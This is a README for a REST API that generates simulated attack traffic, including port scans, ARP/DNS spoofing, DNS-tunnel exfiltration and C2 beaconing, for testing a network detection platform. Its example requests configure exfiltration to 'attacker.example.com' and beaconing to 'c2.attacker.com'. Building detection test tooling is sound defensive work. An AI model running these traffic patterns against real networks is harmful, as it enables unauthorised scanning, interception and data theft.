# Traffic Generator API

A REST API for generating various types of network traffic for penetration testing scenarios and security system validation.

## Overview

This tool generates realistic attack traffic patterns that can be used to test network security monitoring systems like the Sentinel Network Intelligence Platform. It simulates various attack vectors including reconnaissance, man-in-the-middle attacks, data exfiltration, and command & control communications.

## Features

### Supported Attack Types

1. **Reconnaissance Traffic**
   - Port scanning (TCP/UDP)
   - Service enumeration and banner grabbing
   - OS fingerprinting
   - DNS enumeration and subdomain discovery
   - SNMP community string brute forcing

2. **Man-in-the-Middle (MITM) Attacks** 
   - ARP spoofing simulation
   - DNS spoofing and poisoning
   - SSL stripping attacks
   - DHCP starvation

3. **Data Exfiltration**
   - DNS tunneling
   - ICMP covert channels
   - HTTP/HTTPS data uploads
   - Steganographic techniques

4. **Command & Control (C2)**
   - HTTP/HTTPS beaconing
   - DNS-based C2 channels
   - ICMP C2 communications
   - Domain Generation Algorithm (DGA) simulation

## API Endpoints

### Traffic Generation

- `POST /api/traffic/reconnaissance` - Generate reconnaissance traffic
- `POST /api/traffic/mitm` - Generate MITM attack traffic  
- `POST /api/traffic/exfiltration` - Generate data exfiltration traffic
- `POST /api/traffic/c2` - Generate C2 communication traffic

### Session Management

- `GET /api/traffic/sessions` - List active traffic generation sessions
- `GET /api/traffic/sessions/{sessionId}` - Get specific session status
- `POST /api/traffic/sessions/{sessionId}/stop` - Stop traffic generation session

### System Information

- `GET /api/traffic/interfaces` - List available network interfaces
- `GET /api/traffic/capabilities` - Get supported attack types and methods
- `GET /health` - API health check

## Quick Start

### Prerequisites

- .NET 8.0 SDK
- Administrative privileges (required for raw packet generation)
- Windows with WinPcap/Npcap installed

### Build and Run

```bash
# Navigate to project directory
cd TrafficGenerator

# Restore packages and build
dotnet build --no-restore

# Run the API
dotnet run --no-restore
```

The API will be available at `https://localhost:7000` with Swagger UI at the root URL.

## Example Usage

### Generate Port Scan Traffic

```bash
curl -X POST "https://localhost:7000/api/traffic/reconnaissance" \
     -H "Content-Type: application/json" \
     -d '{
       "targetNetwork": "192.168.1.0/24",
       "scanType": "port_scan",
       "ports": ["22", "80", "443", "445"],
       "durationSeconds": 300,
       "aggressiveScan": false,
       "delayBetweenScans": 100
     }'
```

### Generate DNS Exfiltration Traffic

```bash
curl -X POST "https://localhost:7000/api/traffic/exfiltration" \
     -H "Content-Type: application/json" \
     -d '{
       "method": "dns_tunnel",
       "exfilDomain": "attacker.example.com",
       "dataSizeKB": 1024,
       "encodingMethod": "base64",
       "durationSeconds": 600,
       "chunkSizeBytes": 255
     }'
```

### Generate C2 Beaconing Traffic

```bash
curl -X POST "https://localhost:7000/api/traffic/c2" \
     -H "Content-Type: application/json" \
     -d '{
       "c2Protocol": "https",
       "c2Server": "c2.attacker.com",
       "beaconInterval": 30,
       "jitterPercent": 20,
       "durationSeconds": 1800,
       "useDGA": true,
       "userAgents": [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
       ]
     }'
```

## Response Format

All traffic generation endpoints return a response with:

```json
{
  "sessionId": "guid",
  "status": "started|running|completed|failed|cancelled",
  "startTime": "2024-01-01T00:00:00Z",
  "trafficType": "reconnaissance|mitm|exfiltration|c2",
  "packetsGenerated": 1234,
  "bytesGenerated": 567890,
  "warnings": ["Optional warning messages"],
  "details": {
    "Additional session-specific information"
  }
}
```

## Security Considerations

⚠️ **WARNING**: This tool generates actual network traffic that may trigger security systems or be considered malicious activity. Only use in controlled environments with proper authorization.

- Run only in isolated test networks
- Ensure you have permission to generate traffic against target systems
- Monitor resource usage during high-volume traffic generation
- Be aware that some attacks may require administrative privileges

## Integration with Sentinel Platform

This tool is designed to work with the Sentinel Network Intelligence Platform for testing:

1. Start the Sentinel platform to monitor network traffic
2. Use this Traffic Generator to create test scenarios
3. Analyze how well Sentinel detects and classifies the generated traffic
4. Tune detection rules based on results

## Dependencies

- **SharpPcap** - Low-level packet capture and injection
- **PacketDotNet** - Packet parsing and construction
- **DnsClient** - Advanced DNS operations
- **Flurl.Http** - HTTP traffic generation
- **NBomber** - Load testing capabilities
- **BouncyCastle** - Cryptographic operations

## Contributing

This is a specialized tool for network security testing. Contributions should focus on:
- Additional attack pattern implementations
- Improved traffic realism
- Better performance optimization
- Enhanced logging and monitoring

## License

This tool is intended for legitimate security testing purposes only. Users are responsible for compliance with applicable laws and regulations.
